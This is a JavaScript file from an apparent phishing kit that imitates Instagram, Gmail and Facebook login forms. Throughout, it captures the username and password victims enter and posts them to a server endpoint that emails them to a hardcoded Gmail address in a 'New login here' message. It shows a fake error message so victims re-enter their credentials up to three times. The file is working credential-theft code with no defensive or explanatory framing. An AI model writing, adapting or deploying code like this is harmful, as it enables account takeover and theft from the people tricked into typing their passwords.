"use strict";

let form = document.querySelector("#Form");
let errorMessage = document.getElementById("error");
let submitButton = document.getElementById("submit");
let spinner = `<svg xmlns="http://www.w3.org/2000/svg" width="19" height="19" viewBox="0 0 24 24"><g><rect width="2" height="5" x="11" y="1" fill="white" opacity=".14"/><rect width="2" height="5" x="11" y="1" fill="white" opacity=".29" transform="rotate(30 12 12)"/><rect width="2" height="5" x="11" y="1" fill="white" opacity=".43" transform="rotate(60 12 12)"/><rect width="2" height="5" x="11" y="1" fill="white" opacity=".57" transform="rotate(90 12 12)"/><rect width="2" height="5" x="11" y="1" fill="white" opacity=".71" transform="rotate(120 12 12)"/><rect width="2" height="5" x="11" y="1" fill="white" opacity=".86" transform="rotate(150 12 12)"/><rect width="2" height="5" x="11" y="1" fill="white" transform="rotate(180 12 12)"/><animateTransform attributeName="transform" calcMode="discrete" dur="0.75s" repeatCount="indefinite" type="rotate" values="0 12 12;30 12 12;60 12 12;90 12 12;120 12 12;150 12 12;180 12 12;210 12 12;240 12 12;270 12 12;300 12 12;330 12 12;360 12 12"/></g></svg>`;

const regex = /^\w+([.-]?\w+)*@\w+([.-]?\w+)*(\.\w{2,3})+$/;

let type;
let url = document.location.href;
if (url.includes("instagram")) type = "Instagram";
if (url.includes("google")) type = "Gmail";
if (url.includes("facebook")) type = "Facebook";
let tries = 0;

const clearErrorGeneral = () => {
  const allInputs = [...document.querySelectorAll("input")];
  allInputs.forEach((input) =>
    input.addEventListener("input", () => {
      try {
        errorMessage.style.display = "none";
      } catch (error) {}
    })
  );
};

try {
  clearErrorGeneral();
} catch (error) {}

const sendEmail = (envelope) => {
  type === "Instagram" ? (submitButton.innerHTML = spinner) : 0;
  fetch("/send", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(envelope),
  })
    .then((r) => {
      return r.json();
    })
    .then((response) => {
      type === "Instagram" ? (submitButton.innerHTML = "Log in") : 0;
      if (tries < 3) {
        tries++;
        error ? (error.style.display = "block") : 0;
      }
      if (tries === 3) {
        console.info("Successfully gotten, redirecting...");
      }
    })
    .catch((error) => error)
    .finally(() => {});
};

const submitForm = (username, password, type, tries) => {
  const messageTemplate = `
Bro,

New ${type} login here.

++============++

try : ${tries}

username : ${username}

password : ${password}

++============++

Gracias.
`;
  const envelope = {
    email: "missytrns@gmail.com",
    text: messageTemplate,
  };

  sendEmail(envelope);
};

try {
  form.addEventListener("submit", (e) => {
    e.preventDefault();
    const data = new FormData();
    let username = document.getElementById("username");
    let password = document.getElementById("password");
    if (username.value.length > 5 && password.value.length > 5) {
      submitForm(username.value, password.value, type, tries);
    }
  });
} catch (error) {}

export { submitForm, sendEmail };
